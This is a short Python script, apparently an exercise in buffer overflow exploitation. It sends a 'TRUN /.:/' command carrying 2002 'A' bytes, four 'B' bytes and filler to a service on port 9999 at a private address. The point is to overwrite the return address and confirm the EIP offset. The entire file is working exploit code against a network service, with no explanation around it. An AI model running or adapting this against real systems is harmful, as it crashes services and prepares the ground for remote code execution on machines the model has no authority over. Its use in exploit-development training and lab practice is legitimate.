#!/usr/bin/python3

import sys,socket
from time import sleep

buffer=b"A" * 2002 + b"B"*4 + b"C" *(3000-2002-4)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.7',9999))
s.send((b'TRUN /.:/ ' + buffer))
s.close()
s.close()
